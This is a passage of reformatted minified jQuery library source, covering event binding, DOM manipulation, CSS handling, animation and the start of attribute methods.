                    this.on(g, b, c, a[g], e)
                }
                return this
            }
            if (null == c && null == d ? (d = b, c = b = void 0) : null == d && ("string" == typeof b ? (d = c, c = void 0) : (d = c, c = b, b = void 0)), d === !1) {
                d = $
            } else {
                if (!d) {
                    return this
                }
            }
            return 1 === e && (f = d, d = function(a) {
                return n().off(a), f.apply(this, arguments)
            }, d.guid = f.guid || (f.guid = n.guid++)), this.each(function() {
                n.event.add(this, a, d, c, b)
            })
        },
        one: function(a, b, c, d) {
            return this.on(a, b, c, d, 1)
        },
        off: function(a, b, c) {
            var d, e;
            if (a && a.preventDefault && a.handleObj) {
                return d = a.handleObj, n(a.delegateTarget).off(d.namespace ? d.origType + "." + d.namespace : d.origType, d.selector, d.handler), this
            }
            if ("object" == typeof a) {
                for (e in a) {
                    this.off(e, b, a[e])
                }
                return this
            }
            return (b === !1 || "function" == typeof b) && (c = b, b = void 0), c === !1 && (c = $), this.each(function() {
                n.event.remove(this, a, c, b)
            })
        },
        trigger: function(a, b) {
            return this.each(function() {
                n.event.trigger(a, b, this)
            })
        },
        triggerHandler: function(a, b) {
            var c = this[0];
            return c ? n.event.trigger(a, b, c, !0) : void 0
        }
    });
    var aa = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/gi,
        ba = /<([\w:]+)/,
        ca = /<|&#?\w+;/,
        da = /<(?:script|style|link)/i,
        ea = /checked\s*(?:[^=]|=\s*.checked.)/i,
        fa = /^$|\/(?:java|ecma)script/i,
        ga = /^true\/(.*)/,
        ha = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g,
        ia = {
            option: [1, "<select multiple='multiple'>", "</select>"],
            thead: [1, "<table>", "</table>"],
            col: [2, "<table><colgroup>", "</colgroup></table>"],
            tr: [2, "<table><tbody>", "</tbody></table>"],
            td: [3, "<table><tbody><tr>", "</tr></tbody></table>"],
            _default: [0, "", ""]
        };
    ia.optgroup = ia.option, ia.tbody = ia.tfoot = ia.colgroup = ia.caption = ia.thead, ia.th = ia.td;

    function ja(a, b) {
        return n.nodeName(a, "table") && n.nodeName(11 !== b.nodeType ? b : b.firstChild, "tr") ? a.getElementsByTagName("tbody")[0] || a.appendChild(a.ownerDocument.createElement("tbody")) : a
    }

    function ka(a) {
        return a.type = (null !== a.getAttribute("type")) + "/" + a.type, a
    }

    function la(a) {
        var b = ga.exec(a.type);
        return b ? a.type = b[1] : a.removeAttribute("type"), a
    }

    function ma(a, b) {
        for (var c = 0, d = a.length; d > c; c++) {
            L.set(a[c], "globalEval", !b || L.get(b[c], "globalEval"))
        }
    }

    function na(a, b) {
        var c, d, e, f, g, h, i, j;
        if (1 === b.nodeType) {
            if (L.hasData(a) && (f = L.access(a), g = L.set(b, f), j = f.events)) {
                delete g.handle, g.events = {};
                for (e in j) {
                    for (c = 0, d = j[e].length; d > c; c++) {
                        n.event.add(b, e, j[e][c])
                    }
                }
            }
            M.hasData(a) && (h = M.access(a), i = n.extend({}, h), M.set(b, i))
        }
    }

    function oa(a, b) {
        var c = a.getElementsByTagName ? a.getElementsByTagName(b || "*") : a.querySelectorAll ? a.querySelectorAll(b || "*") : [];
        return void 0 === b || b && n.nodeName(a, b) ? n.merge([a], c) : c
    }

    function pa(a, b) {
        var c = b.nodeName.toLowerCase();
        "input" === c && T.test(a.type) ? b.checked = a.checked : ("input" === c || "textarea" === c) && (b.defaultValue = a.defaultValue)
    }
    n.extend({
        clone: function(a, b, c) {
            var d, e, f, g, h = a.cloneNode(!0),
                i = n.contains(a.ownerDocument, a);
            if (!(k.noCloneChecked || 1 !== a.nodeType && 11 !== a.nodeType || n.isXMLDoc(a))) {
                for (g = oa(h), f = oa(a), d = 0, e = f.length; e > d; d++) {
                    pa(f[d], g[d])
                }
            }
            if (b) {
                if (c) {
                    for (f = f || oa(a), g = g || oa(h), d = 0, e = f.length; e > d; d++) {
                        na(f[d], g[d])
                    }
                } else {
                    na(a, h)
                }
            }
            return g = oa(h, "script"), g.length > 0 && ma(g, !i && oa(a, "script")), h
        },
        buildFragment: function(a, b, c, d) {
            for (var e, f, g, h, i, j, k = b.createDocumentFragment(), l = [], m = 0, o = a.length; o > m; m++) {
                if (e = a[m], e || 0 === e) {
                    if ("object" === n.type(e)) {
                        n.merge(l, e.nodeType ? [e] : e)
                    } else {
                        if (ca.test(e)) {
                            f = f || k.appendChild(b.createElement("div")), g = (ba.exec(e) || ["", ""])[1].toLowerCase(), h = ia[g] || ia._default, f.innerHTML = h[1] + e.replace(aa, "<$1></$2>") + h[2], j = h[0];
                            while (j--) {
                                f = f.lastChild
                            }
                            n.merge(l, f.childNodes), f = k.firstChild, f.textContent = ""
                        } else {
                            l.push(b.createTextNode(e))
                        }
                    }
                }
            }
            k.textContent = "", m = 0;
            while (e = l[m++]) {
                if ((!d || -1 === n.inArray(e, d)) && (i = n.contains(e.ownerDocument, e), f = oa(k.appendChild(e), "script"), i && ma(f), c)) {
                    j = 0;
                    while (e = f[j++]) {
                        fa.test(e.type || "") && c.push(e)
                    }
                }
            }
            return k
        },
        cleanData: function(a) {
            for (var b, c, d, e, f = n.event.special, g = 0; void 0 !== (c = a[g]); g++) {
                if (n.acceptData(c) && (e = c[L.expando], e && (b = L.cache[e]))) {
                    if (b.events) {
                        for (d in b.events) {
                            f[d] ? n.event.remove(c, d) : n.removeEvent(c, d, b.handle)
                        }
                    }
                    L.cache[e] && delete L.cache[e]
                }
                delete M.cache[c[M.expando]]
            }
        }
    }), n.fn.extend({
        text: function(a) {
            return J(this, function(a) {
                return void 0 === a ? n.text(this) : this.empty().each(function() {
                    (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) && (this.textContent = a)
                })
            }, null, a, arguments.length)
        },
        append: function() {
            return this.domManip(arguments, function(a) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var b = ja(this, a);
                    b.appendChild(a)
                }
            })
        },
        prepend: function() {
            return this.domManip(arguments, function(a) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var b = ja(this, a);
                    b.insertBefore(a, b.firstChild)
                }
            })
        },
        before: function() {
            return this.domManip(arguments, function(a) {
                this.parentNode && this.parentNode.insertBefore(a, this)
            })
        },
        after: function() {
            return this.domManip(arguments, function(a) {
                this.parentNode && this.parentNode.insertBefore(a, this.nextSibling)
            })
        },
        remove: function(a, b) {
            for (var c, d = a ? n.filter(a, this) : this, e = 0; null != (c = d[e]); e++) {
                b || 1 !== c.nodeType || n.cleanData(oa(c)), c.parentNode && (b && n.contains(c.ownerDocument, c) && ma(oa(c, "script")), c.parentNode.removeChild(c))
            }
            return this
        },
        empty: function() {
            for (var a, b = 0; null != (a = this[b]); b++) {
                1 === a.nodeType && (n.cleanData(oa(a, !1)), a.textContent = "")
            }
            return this
        },
        clone: function(a, b) {
            return a = null == a ? !1 : a, b = null == b ? a : b, this.map(function() {
                return n.clone(this, a, b)
            })
        },
        html: function(a) {
            return J(this, function(a) {
                var b = this[0] || {},
                    c = 0,
                    d = this.length;
                if (void 0 === a && 1 === b.nodeType) {
                    return b.innerHTML
                }
                if ("string" == typeof a && !da.test(a) && !ia[(ba.exec(a) || ["", ""])[1].toLowerCase()]) {
                    a = a.replace(aa, "<$1></$2>");
                    try {
                        for (; d > c; c++) {
                            b = this[c] || {}, 1 === b.nodeType && (n.cleanData(oa(b, !1)), b.innerHTML = a)
                        }
                        b = 0
                    } catch (e) {}
                }
                b && this.empty().append(a)
            }, null, a, arguments.length)
        },
        replaceWith: function() {
            var a = arguments[0];
            return this.domManip(arguments, function(b) {
                a = this.parentNode, n.cleanData(oa(this)), a && a.replaceChild(b, this)
            }), a && (a.length || a.nodeType) ? this : this.remove()
        },
        detach: function(a) {
            return this.remove(a, !0)
        },
        domManip: function(a, b) {
            a = e.apply([], a);
            var c, d, f, g, h, i, j = 0,
                l = this.length,
                m = this,
                o = l - 1,
                p = a[0],
                q = n.isFunction(p);
            if (q || l > 1 && "string" == typeof p && !k.checkClone && ea.test(p)) {
                return this.each(function(c) {
                    var d = m.eq(c);
                    q && (a[0] = p.call(this, c, d.html())), d.domManip(a, b)
                })
            }
            if (l && (c = n.buildFragment(a, this[0].ownerDocument, !1, this), d = c.firstChild, 1 === c.childNodes.length && (c = d), d)) {
                for (f = n.map(oa(c, "script"), ka), g = f.length; l > j; j++) {
                    h = c, j !== o && (h = n.clone(h, !0, !0), g && n.merge(f, oa(h, "script"))), b.call(this[j], h, j)
                }
                if (g) {
                    for (i = f[f.length - 1].ownerDocument, n.map(f, la), j = 0; g > j; j++) {
                        h = f[j], fa.test(h.type || "") && !L.access(h, "globalEval") && n.contains(i, h) && (h.src ? n._evalUrl && n._evalUrl(h.src) : n.globalEval(h.textContent.replace(ha, "")))
                    }
                }
            }
            return this
        }
    }), n.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, function(a, b) {
        n.fn[a] = function(a) {
            for (var c, d = [], e = n(a), g = e.length - 1, h = 0; g >= h; h++) {
                c = h === g ? this : this.clone(!0), n(e[h])[b](c), f.apply(d, c.get())
            }
            return this.pushStack(d)
        }
    });
    var qa, ra = {};

    function sa(b, c) {
        var d, e = n(c.createElement(b)).appendTo(c.body),
            f = a.getDefaultComputedStyle && (d = a.getDefaultComputedStyle(e[0])) ? d.display : n.css(e[0], "display");
        return e.detach(), f
    }

    function ta(a) {
        var b = l,
            c = ra[a];
        return c || (c = sa(a, b), "none" !== c && c || (qa = (qa || n("<iframe frameborder='0' width='0' height='0'/>")).appendTo(b.documentElement), b = qa[0].contentDocument, b.write(), b.close(), c = sa(a, b), qa.detach()), ra[a] = c), c
    }
    var ua = /^margin/,
        va = new RegExp("^(" + Q + ")(?!px)[a-z%]+$", "i"),
        wa = function(b) {
            return b.ownerDocument.defaultView.opener ? b.ownerDocument.defaultView.getComputedStyle(b, null) : a.getComputedStyle(b, null)
        };

    function xa(a, b, c) {
        var d, e, f, g, h = a.style;
        return c = c || wa(a), c && (g = c.getPropertyValue(b) || c[b]), c && ("" !== g || n.contains(a.ownerDocument, a) || (g = n.style(a, b)), va.test(g) && ua.test(b) && (d = h.width, e = h.minWidth, f = h.maxWidth, h.minWidth = h.maxWidth = h.width = g, g = c.width, h.width = d, h.minWidth = e, h.maxWidth = f)), void 0 !== g ? g + "" : g
    }

    function ya(a, b) {
        return {
            get: function() {
                return a() ? void delete this.get : (this.get = b).apply(this, arguments)
            }
        }
    }! function() {
        var b, c, d = l.documentElement,
            e = l.createElement("div"),
            f = l.createElement("div");
        if (f.style) {
            f.style.backgroundClip = "content-box", f.cloneNode(!0).style.backgroundClip = "", k.clearCloneStyle = "content-box" === f.style.backgroundClip, e.style.cssText = "border:0;width:0;height:0;top:0;left:-9999px;margin-top:1px;position:absolute", e.appendChild(f);

            function g() {
                f.style.cssText = "-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;display:block;margin-top:1%;top:1%;border:1px;padding:1px;width:4px;position:absolute", f.innerHTML = "", d.appendChild(e);
                var g = a.getComputedStyle(f, null);
                b = "1%" !== g.top, c = "4px" === g.width, d.removeChild(e)
            }
            a.getComputedStyle && n.extend(k, {
                pixelPosition: function() {
                    return g(), b
                },
                boxSizingReliable: function() {
                    return null == c && g(), c
                },
                reliableMarginRight: function() {
                    var b, c = f.appendChild(l.createElement("div"));
                    return c.style.cssText = f.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0", c.style.marginRight = c.style.width = "0", f.style.width = "1px", d.appendChild(e), b = !parseFloat(a.getComputedStyle(c, null).marginRight), d.removeChild(e), f.removeChild(c), b
                }
            })
        }
    }(), n.swap = function(a, b, c, d) {
        var e, f, g = {};
        for (f in b) {
            g[f] = a.style[f], a.style[f] = b[f]
        }
        e = c.apply(a, d || []);
        for (f in b) {
            a.style[f] = g[f]
        }
        return e
    };
    var za = /^(none|table(?!-c[ea]).+)/,
        Aa = new RegExp("^(" + Q + ")(.*)$", "i"),
        Ba = new RegExp("^([+-])=(" + Q + ")", "i"),
        Ca = {
            position: "absolute",
            visibility: "hidden",
            display: "block"
        },
        Da = {
            letterSpacing: "0",
            fontWeight: "400"
        },
        Ea = ["Webkit", "O", "Moz", "ms"];

    function Fa(a, b) {
        if (b in a) {
            return b
        }
        var c = b[0].toUpperCase() + b.slice(1),
            d = b,
            e = Ea.length;
        while (e--) {
            if (b = Ea[e] + c, b in a) {
                return b
            }
        }
        return d
    }

    function Ga(a, b, c) {
        var d = Aa.exec(b);
        return d ? Math.max(0, d[1] - (c || 0)) + (d[2] || "px") : b
    }

    function Ha(a, b, c, d, e) {
        for (var f = c === (d ? "border" : "content") ? 4 : "width" === b ? 1 : 0, g = 0; 4 > f; f += 2) {
            "margin" === c && (g += n.css(a, c + R[f], !0, e)), d ? ("content" === c && (g -= n.css(a, "padding" + R[f], !0, e)), "margin" !== c && (g -= n.css(a, "border" + R[f] + "Width", !0, e))) : (g += n.css(a, "padding" + R[f], !0, e), "padding" !== c && (g += n.css(a, "border" + R[f] + "Width", !0, e)))
        }
        return g
    }

    function Ia(a, b, c) {
        var d = !0,
            e = "width" === b ? a.offsetWidth : a.offsetHeight,
            f = wa(a),
            g = "border-box" === n.css(a, "boxSizing", !1, f);
        if (0 >= e || null == e) {
            if (e = xa(a, b, f), (0 > e || null == e) && (e = a.style[b]), va.test(e)) {
                return e
            }
            d = g && (k.boxSizingReliable() || e === a.style[b]), e = parseFloat(e) || 0
        }
        return e + Ha(a, b, c || (g ? "border" : "content"), d, f) + "px"
    }

    function Ja(a, b) {
        for (var c, d, e, f = [], g = 0, h = a.length; h > g; g++) {
            d = a[g], d.style && (f[g] = L.get(d, "olddisplay"), c = d.style.display, b ? (f[g] || "none" !== c || (d.style.display = ""), "" === d.style.display && S(d) && (f[g] = L.access(d, "olddisplay", ta(d.nodeName)))) : (e = S(d), "none" === c && e || L.set(d, "olddisplay", e ? c : n.css(d, "display"))))
        }
        for (g = 0; h > g; g++) {
            d = a[g], d.style && (b && "none" !== d.style.display && "" !== d.style.display || (d.style.display = b ? f[g] || "" : "none"))
        }
        return a
    }
    n.extend({
        cssHooks: {
            opacity: {
                get: function(a, b) {
                    if (b) {
                        var c = xa(a, "opacity");
                        return "" === c ? "1" : c
                    }
                }
            }
        },
        cssNumber: {
            columnCount: !0,
            fillOpacity: !0,
            flexGrow: !0,
            flexShrink: !0,
            fontWeight: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {
            "float": "cssFloat"
        },
        style: function(a, b, c, d) {
            if (a && 3 !== a.nodeType && 8 !== a.nodeType && a.style) {
                var e, f, g, h = n.camelCase(b),
                    i = a.style;
                return b = n.cssProps[h] || (n.cssProps[h] = Fa(i, h)), g = n.cssHooks[b] || n.cssHooks[h], void 0 === c ? g && "get" in g && void 0 !== (e = g.get(a, !1, d)) ? e : i[b] : (f = typeof c, "string" === f && (e = Ba.exec(c)) && (c = (e[1] + 1) * e[2] + parseFloat(n.css(a, b)), f = "number"), null != c && c === c && ("number" !== f || n.cssNumber[h] || (c += "px"), k.clearCloneStyle || "" !== c || 0 !== b.indexOf("background") || (i[b] = "inherit"), g && "set" in g && void 0 === (c = g.set(a, c, d)) || (i[b] = c)), void 0)
            }
        },
        css: function(a, b, c, d) {
            var e, f, g, h = n.camelCase(b);
            return b = n.cssProps[h] || (n.cssProps[h] = Fa(a.style, h)), g = n.cssHooks[b] || n.cssHooks[h], g && "get" in g && (e = g.get(a, !0, c)), void 0 === e && (e = xa(a, b, d)), "normal" === e && b in Da && (e = Da[b]), "" === c || c ? (f = parseFloat(e), c === !0 || n.isNumeric(f) ? f || 0 : e) : e
        }
    }), n.each(["height", "width"], function(a, b) {
        n.cssHooks[b] = {
            get: function(a, c, d) {
                return c ? za.test(n.css(a, "display")) && 0 === a.offsetWidth ? n.swap(a, Ca, function() {
                    return Ia(a, b, d)
                }) : Ia(a, b, d) : void 0
            },
            set: function(a, c, d) {
                var e = d && wa(a);
                return Ga(a, c, d ? Ha(a, b, d, "border-box" === n.css(a, "boxSizing", !1, e), e) : 0)
            }
        }
    }), n.cssHooks.marginRight = ya(k.reliableMarginRight, function(a, b) {
        return b ? n.swap(a, {
            display: "inline-block"
        }, xa, [a, "marginRight"]) : void 0
    }), n.each({
        margin: "",
        padding: "",
        border: "Width"
    }, function(a, b) {
        n.cssHooks[a + b] = {
            expand: function(c) {
                for (var d = 0, e = {}, f = "string" == typeof c ? c.split(" ") : [c]; 4 > d; d++) {
                    e[a + R[d] + b] = f[d] || f[d - 2] || f[0]
                }
                return e
            }
        }, ua.test(a) || (n.cssHooks[a + b].set = Ga)
    }), n.fn.extend({
        css: function(a, b) {
            return J(this, function(a, b, c) {
                var d, e, f = {},
                    g = 0;
                if (n.isArray(b)) {
                    for (d = wa(a), e = b.length; e > g; g++) {
                        f[b[g]] = n.css(a, b[g], !1, d)
                    }
                    return f
                }
                return void 0 !== c ? n.style(a, b, c) : n.css(a, b)
            }, a, b, arguments.length > 1)
        },
        show: function() {
            return Ja(this, !0)
        },
        hide: function() {
            return Ja(this)
        },
        toggle: function(a) {
            return "boolean" == typeof a ? a ? this.show() : this.hide() : this.each(function() {
                S(this) ? n(this).show() : n(this).hide()
            })
        }
    });

    function Ka(a, b, c, d, e) {
        return new Ka.prototype.init(a, b, c, d, e)
    }
    n.Tween = Ka, Ka.prototype = {
        constructor: Ka,
        init: function(a, b, c, d, e, f) {
            this.elem = a, this.prop = c, this.easing = e || "swing", this.options = b, this.start = this.now = this.cur(), this.end = d, this.unit = f || (n.cssNumber[c] ? "" : "px")
        },
        cur: function() {
            var a = Ka.propHooks[this.prop];
            return a && a.get ? a.get(this) : Ka.propHooks._default.get(this)
        },
        run: function(a) {
            var b, c = Ka.propHooks[this.prop];
            return this.options.duration ? this.pos = b = n.easing[this.easing](a, this.options.duration * a, 0, 1, this.options.duration) : this.pos = b = a, this.now = (this.end - this.start) * b + this.start, this.options.step && this.options.step.call(this.elem, this.now, this), c && c.set ? c.set(this) : Ka.propHooks._default.set(this), this
        }
    }, Ka.prototype.init.prototype = Ka.prototype, Ka.propHooks = {
        _default: {
            get: function(a) {
                var b;
                return null == a.elem[a.prop] || a.elem.style && null != a.elem.style[a.prop] ? (b = n.css(a.elem, a.prop, ""), b && "auto" !== b ? b : 0) : a.elem[a.prop]
            },
            set: function(a) {
                n.fx.step[a.prop] ? n.fx.step[a.prop](a) : a.elem.style && (null != a.elem.style[n.cssProps[a.prop]] || n.cssHooks[a.prop]) ? n.style(a.elem, a.prop, a.now + a.unit) : a.elem[a.prop] = a.now
            }
        }
    }, Ka.propHooks.scrollTop = Ka.propHooks.scrollLeft = {
        set: function(a) {
            a.elem.nodeType && a.elem.parentNode && (a.elem[a.prop] = a.now)
        }
    }, n.easing = {
        linear: function(a) {
            return a
        },
        swing: function(a) {
            return 0.5 - Math.cos(a * Math.PI) / 2
        }
    }, n.fx = Ka.prototype.init, n.fx.step = {};
    var La, Ma, Na = /^(?:toggle|show|hide)$/,
        Oa = new RegExp("^(?:([+-])=|)(" + Q + ")([a-z%]*)$", "i"),
        Pa = /queueHooks$/,
        Qa = [Va],
        Ra = {
            "*": [function(a, b) {
                var c = this.createTween(a, b),
                    d = c.cur(),
                    e = Oa.exec(b),
                    f = e && e[3] || (n.cssNumber[a] ? "" : "px"),
                    g = (n.cssNumber[a] || "px" !== f && +d) && Oa.exec(n.css(c.elem, a)),
                    h = 1,
                    i = 20;
                if (g && g[3] !== f) {
                    f = f || g[3], e = e || [], g = +d || 1;
                    do {
                        h = h || ".5", g /= h, n.style(c.elem, a, g + f)
                    } while (h !== (h = c.cur() / d) && 1 !== h && --i)
                }
                return e && (g = c.start = +g || +d || 0, c.unit = f, c.end = e[1] ? g + (e[1] + 1) * e[2] : +e[2]), c
            }]
        };

    function Sa() {
        return setTimeout(function() {
            La = void 0
        }), La = n.now()
    }

    function Ta(a, b) {
        var c, d = 0,
            e = {
                height: a
            };
        for (b = b ? 1 : 0; 4 > d; d += 2 - b) {
            c = R[d], e["margin" + c] = e["padding" + c] = a
        }
        return b && (e.opacity = e.width = a), e
    }

    function Ua(a, b, c) {
        for (var d, e = (Ra[b] || []).concat(Ra["*"]), f = 0, g = e.length; g > f; f++) {
            if (d = e[f].call(c, b, a)) {
                return d
            }
        }
    }

    function Va(a, b, c) {
        var d, e, f, g, h, i, j, k, l = this,
            m = {},
            o = a.style,
            p = a.nodeType && S(a),
            q = L.get(a, "fxshow");
        c.queue || (h = n._queueHooks(a, "fx"), null == h.unqueued && (h.unqueued = 0, i = h.empty.fire, h.empty.fire = function() {
            h.unqueued || i()
        }), h.unqueued++, l.always(function() {
            l.always(function() {
                h.unqueued--, n.queue(a, "fx").length || h.empty.fire()
            })
        })), 1 === a.nodeType && ("height" in b || "width" in b) && (c.overflow = [o.overflow, o.overflowX, o.overflowY], j = n.css(a, "display"), k = "none" === j ? L.get(a, "olddisplay") || ta(a.nodeName) : j, "inline" === k && "none" === n.css(a, "float") && (o.display = "inline-block")), c.overflow && (o.overflow = "hidden", l.always(function() {
            o.overflow = c.overflow[0], o.overflowX = c.overflow[1], o.overflowY = c.overflow[2]
        }));
        for (d in b) {
            if (e = b[d], Na.exec(e)) {
                if (delete b[d], f = f || "toggle" === e, e === (p ? "hide" : "show")) {
                    if ("show" !== e || !q || void 0 === q[d]) {
                        continue
                    }
                    p = !0
                }
                m[d] = q && q[d] || n.style(a, d)
            } else {
                j = void 0
            }
        }
        if (n.isEmptyObject(m)) {
            "inline" === ("none" === j ? ta(a.nodeName) : j) && (o.display = j)
        } else {
            q ? "hidden" in q && (p = q.hidden) : q = L.access(a, "fxshow", {}), f && (q.hidden = !p), p ? n(a).show() : l.done(function() {
                n(a).hide()
            }), l.done(function() {
                var b;
                L.remove(a, "fxshow");
                for (b in m) {
                    n.style(a, b, m[b])
                }
            });
            for (d in m) {
                g = Ua(p ? q[d] : 0, d, l), d in q || (q[d] = g.start, p && (g.end = g.start, g.start = "width" === d || "height" === d ? 1 : 0))
            }
        }
    }

    function Wa(a, b) {
        var c, d, e, f, g;
        for (c in a) {
            if (d = n.camelCase(c), e = b[d], f = a[c], n.isArray(f) && (e = f[1], f = a[c] = f[0]), c !== d && (a[d] = f, delete a[c]), g = n.cssHooks[d], g && "expand" in g) {
                f = g.expand(f), delete a[d];
                for (c in f) {
                    c in a || (a[c] = f[c], b[c] = e)
                }
            } else {
                b[d] = e
            }
        }
    }

    function Xa(a, b, c) {
        var d, e, f = 0,
            g = Qa.length,
            h = n.Deferred().always(function() {
                delete i.elem
            }),
            i = function() {
                if (e) {
                    return !1
                }
                for (var b = La || Sa(), c = Math.max(0, j.startTime + j.duration - b), d = c / j.duration || 0, f = 1 - d, g = 0, i = j.tweens.length; i > g; g++) {
                    j.tweens[g].run(f)
                }
                return h.notifyWith(a, [j, f, c]), 1 > f && i ? c : (h.resolveWith(a, [j]), !1)
            },
            j = h.promise({
                elem: a,
                props: n.extend({}, b),
                opts: n.extend(!0, {
                    specialEasing: {}
                }, c),
                originalProperties: b,
                originalOptions: c,
                startTime: La || Sa(),
                duration: c.duration,
                tweens: [],
                createTween: function(b, c) {
                    var d = n.Tween(a, j.opts, b, c, j.opts.specialEasing[b] || j.opts.easing);
                    return j.tweens.push(d), d
                },
                stop: function(b) {
                    var c = 0,
                        d = b ? j.tweens.length : 0;
                    if (e) {
                        return this
                    }
                    for (e = !0; d > c; c++) {
                        j.tweens[c].run(1)
                    }
                    return b ? h.resolveWith(a, [j, b]) : h.rejectWith(a, [j, b]), this
                }
            }),
            k = j.props;
        for (Wa(k, j.opts.specialEasing); g > f; f++) {
            if (d = Qa[f].call(j, a, k, j.opts)) {
                return d
            }
        }
        return n.map(k, Ua, j), n.isFunction(j.opts.start) && j.opts.start.call(a, j), n.fx.timer(n.extend(i, {
            elem: a,
            anim: j,
            queue: j.opts.queue
        })), j.progress(j.opts.progress).done(j.opts.done, j.opts.complete).fail(j.opts.fail).always(j.opts.always)
    }
    n.Animation = n.extend(Xa, {
            tweener: function(a, b) {
                n.isFunction(a) ? (b = a, a = ["*"]) : a = a.split(" ");
                for (var c, d = 0, e = a.length; e > d; d++) {
                    c = a[d], Ra[c] = Ra[c] || [], Ra[c].unshift(b)
                }
            },
            prefilter: function(a, b) {
                b ? Qa.unshift(a) : Qa.push(a)
            }
        }), n.speed = function(a, b, c) {
            var d = a && "object" == typeof a ? n.extend({}, a) : {
                complete: c || !c && b || n.isFunction(a) && a,
                duration: a,
                easing: c && b || b && !n.isFunction(b) && b
            };
            return d.duration = n.fx.off ? 0 : "number" == typeof d.duration ? d.duration : d.duration in n.fx.speeds ? n.fx.speeds[d.duration] : n.fx.speeds._default, (null == d.queue || d.queue === !0) && (d.queue = "fx"), d.old = d.complete, d.complete = function() {
                n.isFunction(d.old) && d.old.call(this), d.queue && n.dequeue(this, d.queue)
            }, d
        }, n.fn.extend({
            fadeTo: function(a, b, c, d) {
                return this.filter(S).css("opacity", 0).show().end().animate({
                    opacity: b
                }, a, c, d)
            },
            animate: function(a, b, c, d) {
                var e = n.isEmptyObject(a),
                    f = n.speed(b, c, d),
                    g = function() {
                        var b = Xa(this, n.extend({}, a), f);
                        (e || L.get(this, "finish")) && b.stop(!0)
                    };
                return g.finish = g, e || f.queue === !1 ? this.each(g) : this.queue(f.queue, g)
            },
            stop: function(a, b, c) {
                var d = function(a) {
                    var b = a.stop;
                    delete a.stop, b(c)
                };
                return "string" != typeof a && (c = b, b = a, a = void 0), b && a !== !1 && this.queue(a || "fx", []), this.each(function() {
                    var b = !0,
                        e = null != a && a + "queueHooks",
                        f = n.timers,
                        g = L.get(this);
                    if (e) {
                        g[e] && g[e].stop && d(g[e])
                    } else {
                        for (e in g) {
                            g[e] && g[e].stop && Pa.test(e) && d(g[e])
                        }
                    }
                    for (e = f.length; e--;) {
                        f[e].elem !== this || null != a && f[e].queue !== a || (f[e].anim.stop(c), b = !1, f.splice(e, 1))
                    }(b || !c) && n.dequeue(this, a)
                })
            },
            finish: function(a) {
                return a !== !1 && (a = a || "fx"), this.each(function() {
                    var b, c = L.get(this),
                        d = c[a + "queue"],
                        e = c[a + "queueHooks"],
                        f = n.timers,
                        g = d ? d.length : 0;
                    for (c.finish = !0, n.queue(this, a, []), e && e.stop && e.stop.call(this, !0), b = f.length; b--;) {
                        f[b].elem === this && f[b].queue === a && (f[b].anim.stop(!0), f.splice(b, 1))
                    }
                    for (b = 0; g > b; b++) {
                        d[b] && d[b].finish && d[b].finish.call(this)
                    }
                    delete c.finish
                })
            }
        }), n.each(["toggle", "show", "hide"], function(a, b) {
            var c = n.fn[b];
            n.fn[b] = function(a, d, e) {
                return null == a || "boolean" == typeof a ? c.apply(this, arguments) : this.animate(Ta(b, !0), a, d, e)
            }
        }), n.each({
            slideDown: Ta("show"),
            slideUp: Ta("hide"),
            slideToggle: Ta("toggle"),
            fadeIn: {
                opacity: "show"
            },
            fadeOut: {
                opacity: "hide"
            },
            fadeToggle: {
                opacity: "toggle"
            }
        }, function(a, b) {
            n.fn[a] = function(a, c, d) {
                return this.animate(b, a, c, d)
            }
        }), n.timers = [], n.fx.tick = function() {
            var a, b = 0,
                c = n.timers;
            for (La = n.now(); b < c.length; b++) {
                a = c[b], a() || c[b] !== a || c.splice(b--, 1)
            }
            c.length || n.fx.stop(), La = void 0
        }, n.fx.timer = function(a) {
            n.timers.push(a), a() ? n.fx.start() : n.timers.pop()
        }, n.fx.interval = 13, n.fx.start = function() {
            Ma || (Ma = setInterval(n.fx.tick, n.fx.interval))
        }, n.fx.stop = function() {
            clearInterval(Ma), Ma = null
        }, n.fx.speeds = {
            slow: 600,
            fast: 200,
            _default: 400
        }, n.fn.delay = function(a, b) {
            return a = n.fx ? n.fx.speeds[a] || a : a, b = b || "fx", this.queue(b, function(b, c) {
                var d = setTimeout(b, a);
                c.stop = function() {
                    clearTimeout(d)
                }
            })
        },
        function() {
            var a = l.createElement("input"),
                b = l.createElement("select"),
                c = b.appendChild(l.createElement("option"));
            a.type = "checkbox", k.checkOn = "" !== a.value, k.optSelected = c.selected, b.disabled = !0, k.optDisabled = !c.disabled, a = l.createElement("input"), a.value = "t", a.type = "radio", k.radioValue = "t" === a.value
        }();
    var Ya, Za, $a = n.expr.attrHandle;
    n.fn.extend({
        attr: function(a, b) {
            return J(this, n.attr, a, b, arguments.length > 1)
        },
        removeAttr: function(a) {
            return this.each(function() {
                n.removeAttr(this, a)
            })
        }
    }), n.extend({
        attr: function(a, b, c) {
            var d, e, f = a.nodeType;
            if (a && 3 !== f && 8 !== f && 2 !== f) {
                return typeof a.getAttribute === U ? n.prop(a, b, c) : (1 === f && n.isXMLDoc(a) || (b = b.toLowerCase(), d = n.attrHooks[b] || (n.expr.match.bool.test(b) ? Za : Ya)), void 0 === c ? d && "get" in d && null !== (e = d.get(a, b)) ? e : (e = n.find.attr(a, b), null == e ? void 0 : e) : null !== c ? d && "set" in d && void 0 !== (e = d.set(a, c, b)) ? e : (a.setAttribute(b, c + ""), c) : void n.removeAttr(a, b))
            }
        },
        removeAttr: function(a, b) {
            var c, d, e = 0,
                f = b && b.match(E);
            if (f && 1 === a.nodeType) {
                while (c = f[e++]) {
                    d = n.propFix[c] || c, n.expr.match.bool.test(c) && (a[d] = !1), a.removeAttribute(c)
                }
            }
        },
        attrHooks: {
            type: {
                set: function(a, b) {
                    if (!k.radioValue && "radio" === b && n.nodeName(a, "input")) {
                        var c = a.value;
